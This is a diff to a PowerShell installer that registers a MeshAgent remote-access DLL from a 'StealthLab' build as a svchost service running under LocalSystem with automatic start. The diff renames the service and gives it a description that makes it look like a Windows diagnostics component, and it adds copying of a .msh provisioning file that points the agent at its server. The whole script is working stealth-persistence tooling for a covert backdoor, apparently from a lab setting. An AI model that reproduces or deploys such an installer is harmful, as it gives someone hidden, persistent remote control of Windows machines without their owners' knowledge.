@@ -1,7 +1,8 @@
 #Requires -RunAsAdministrator
 [CmdletBinding()]
 param(
-    [string]$DllSource
+    [string]$DllSource,
+    [string]$MshSource
 )
 
 Set-StrictMode -Version Latest
@@ -12,16 +13,33 @@ function Write-Ok   { param([string]$Message) Write-Host ("[ OK ] {0}" -f $Messa
 function Write-Warn { param([string]$Message) Write-Host ("[WARN] {0}" -f $Message) -ForegroundColor Yellow }
 function Write-Err  { param([string]$Message) Write-Host ("[ERR ] {0}" -f $Message) -ForegroundColor Red }
 
-$serviceName = "WinDiagnosticHost"
+$serviceName = "DiagHostSvc"
+$displayName = "Diagnostics Host Service"
+$description = "Local diagnostics agent"
 $programData = [Environment]::GetFolderPath('CommonApplicationData')
 if (-not $programData) { $programData = Join-Path $env:SystemRoot 'ProgramData' }
-$installDir  = Join-Path $programData "DiagnosticHost"
+$installDir  = Join-Path $programData "WinDiagnosticHost"
 $dllTarget   = Join-Path $installDir "diagsvc.dll"
 $svchostExe  = "%SystemRoot%\System32\svchost.exe"
+$repoRoot    = Split-Path -Parent $PSCommandPath
 
 if (-not $DllSource) {
-    $repoRoot = Split-Path -Parent $PSCommandPath
     $DllSource = Join-Path $repoRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
+}
+
+if (-not $MshSource) {
+    $defaultMsh = Join-Path $repoRoot "WinDiagnosticHost.msh"
+    if (Test-Path $defaultMsh) {
+        $MshSource = $defaultMsh
+    } else {
+        $distRoot = Join-Path $repoRoot "dist"
+        $latestMsh = Get-ChildItem -Path $distRoot -Filter "*.msh" -Recurse -ErrorAction SilentlyContinue |
+            Sort-Object LastWriteTime -Descending |
+            Select-Object -First 1
+        if ($latestMsh) {
+            $MshSource = $latestMsh.FullName
+        }
+    }
 }
 
 Write-Host "Installing MeshAgent svchost service ($serviceName)..." -ForegroundColor Cyan
@@ -37,14 +55,30 @@ New-Item -ItemType Directory -Path $installDir -Force | Out-Null
 Copy-Item -Path $DllSource -Destination $dllTarget -Force
 Write-Ok ("Copied DLL to {0}" -f $dllTarget)
 
+if ($MshSource -and (Test-Path $MshSource)) {
+    $mshTarget = Join-Path $installDir ".msh"
+    Copy-Item -Path $MshSource -Destination $mshTarget -Force
+    Write-Ok ("Copied provisioning file to {0}" -f $mshTarget)
+
+    $dllBaseMsh = Join-Path $installDir (([System.IO.Path]::GetFileNameWithoutExtension($dllTarget)) + ".msh")
+    Copy-Item -Path $MshSource -Destination $dllBaseMsh -Force
+
+    $namedMsh = Join-Path $installDir (Split-Path -Path $MshSource -Leaf)
+    if ($namedMsh -ne $mshTarget) {
+        Copy-Item -Path $MshSource -Destination $namedMsh -Force
+    }
+} else {
+    Write-Warn "Provisioning file (.msh) not found; specify -MshSource to ensure connectivity."
+}
+
 # Create/update service
 $serviceExists = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
 if (-not $serviceExists) {
     Write-Info "Creating service registration"
-    sc.exe create $serviceName binPath= "$svchostExe -k netsvcs -p" type= share start= auto DisplayName= "Windows Diagnostic Host Service" obj= LocalSystem | Out-Null
+    sc.exe create $serviceName binPath= "$svchostExe -k netsvcs -p" type= share start= auto DisplayName= "$displayName" obj= LocalSystem | Out-Null
 } else {
     Write-Info "Service already exists, updating configuration"
-    sc.exe config $serviceName binPath= "$svchostExe -k netsvcs -p" type= share start= auto obj= LocalSystem | Out-Null
+    sc.exe config $serviceName binPath= "$svchostExe -k netsvcs -p" type= share start= auto DisplayName= "$displayName" obj= LocalSystem | Out-Null
 }
 
 # Configure Parameters key
@@ -52,6 +86,8 @@ $paramsPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName\Parameters"
 New-Item -Path $paramsPath -Force | Out-Null
 Set-ItemProperty -Path $paramsPath -Name ServiceDll -Value $dllTarget -Type ExpandString
 Set-ItemProperty -Path $paramsPath -Name ServiceMain -Value "Stealth_SvchostServiceMain" -Type String
+$serviceRoot = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
+Set-ItemProperty -Path $serviceRoot -Name Description -Value $description -Type String
 
 # Ensure netsvcs membership
 $svchostKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
